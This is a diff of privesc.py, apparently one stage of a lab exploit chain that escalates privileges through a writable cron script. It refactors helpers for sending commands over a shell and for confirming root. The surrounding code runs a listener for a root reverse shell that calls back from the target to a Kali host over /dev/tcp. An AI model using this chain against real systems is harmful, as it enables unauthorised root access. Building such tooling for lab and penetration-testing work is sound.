@@ -1,7 +1,7 @@
 import socket
 import time
 
-from chainlog import log
+from chainlog import log, run_remote, send_command
 
 # =============================================================================
 # privesc.py — Privilege Escalation via Writable Cron Script
@@ -14,11 +14,6 @@ KALI_HOST = "10.10.0.2"  # Static IP from compose IPAM; payload uses /dev/tcp/<i
 PORT_ROOT = 5555
 CLEANUP_SCRIPT = "/opt/cleanup.sh"
 
-
-def send_command(shell, command):
-    """Send a command through an active shell connection."""
-    shell.sendall((command + "\n").encode())
-    time.sleep(0.5)
 
 
 def run(www_shell, kali_host=KALI_HOST, cron_script=CLEANUP_SCRIPT):
@@ -72,22 +67,8 @@ def run(www_shell, kali_host=KALI_HOST, cron_script=CLEANUP_SCRIPT):
     finally:
         root_server.close()
 
-    # Confirm root — read in a loop until "uid=" appears or the timeout
-    # elapses (so the initial banner / prompt isn't skipped).
     time.sleep(1)
-    send_command(root_shell, "id")
-    root_shell.settimeout(5)
-    response = ""
-    deadline = time.time() + 10
-    while time.time() < deadline:
-        try:
-            chunk = root_shell.recv(1024).decode(errors="replace")
-            if chunk:
-                response += chunk
-                if "uid=" in response:
-                    break
-        except socket.timeout:
-            break
+    response = run_remote(root_shell, "id", timeout=10)
 
     if "uid=0(root)" in response:
         log("[+] Privilege escalation successful!")
